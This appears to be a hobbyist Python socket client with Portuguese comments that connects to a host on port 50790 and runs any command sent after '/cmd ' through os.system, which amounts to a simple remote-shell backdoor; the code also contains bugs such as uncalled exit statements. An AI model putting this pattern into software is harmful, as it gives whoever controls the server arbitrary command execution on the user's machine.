import os, time
import socket

# função de limpar tela universal - entre WinNT e POSIX (Linux, macOS)
from platform import system as system_name
def limparTela():
    os.system('cls' if os.name == 'nt' else 'clear')


podeConectar = False

HOST = input("Digite o nome do host: ") #'127.0.0.1'
if HOST == "" :
    HOST = "ihack-de-rafael.local"
    print("\nUsando " + HOST + "!\n")

PORT = 50790  # ADV0 em T9

tcp = socket.socket( socket.AF_INET , socket.SOCK_STREAM )
dest = (HOST, PORT)
print("HOST: " + HOST + ", PORT: " + str(PORT))
try:
    tcp.connect(dest)
    podeConectar = True
    pass
    
except ConnectionRefusedError:
    print("\nConexão recusada! O servidor está online?\n\n")
    exit

def capturarEntrada() :
    global msg
    
    while True:
        msg = input(">> ")


def interagirSocket():
    global msg
    global tcp

    print("Para sair use CTRL+X\n")

    msg_inicial = "Olá!"
    msg = msg_inicial

    print("Você disse '" + msg + "' para o servidor...")

    while True:         # respeitar ordem correta de operações para não dar problema
        time.sleep(0.5) # escrever linhas de forma organizada e sem cagar tudo
                        # envia qualquer coisa
        
        try:
            tcp.send(msg.encode())      # send() ou sendall()
            pass

        except BrokenPipeError:
            print("Conexão quebrada! Reinicie o cliente!")
            exit
    
        msg = "invalido"                # um controle de fluxo simples ;-)

        data_received = tcp.recv(1024)
        recv = data_received.decode()
        if len(recv) > 0:
            print(recv)

        if "/cmd " in recv :
            verb = recv.split("/cmd ")[1]
            
            try:
                os.system(verb)

            except OSError as e:
                print("Comando não encontrado!")
                print(e)


            # condicionais específicas
            if verb == "cls" or "clear" :
                limparTela()

            if verb == "quit" :
                tcp.close()
                exit


# criar threads    
import threading
thread_list = {}

# nosso querido entrypoint - especificar para o Python3 executar mais rapidamente
if __name__ == '__main__': 

    # declarar threads
    thread_list["capturarEntrada"]            = threading.Thread(target=capturarEntrada , name="capturarEntrada", args=() )
    thread_list["interagirSocket"]            = threading.Thread(target=interagirSocket , name="interagirSocket", args=() )

    # iniciar threads
    if podeConectar == True :
        thread_list["capturarEntrada"].start()
        thread_list["interagirSocket"].start()

        # DEBUG
        #while True:
        #    thread_list["capturarEntrada"].join(timeout=3)

    # fim da condicional de conexao valida com servidor!

    # não existe como matar threads no Python. 
    # É necessário usar threading.join() e esperar que a thread conclua suas atividades.

    #tcp.close()    # não encerrar aqui... usar a thread!
    quit
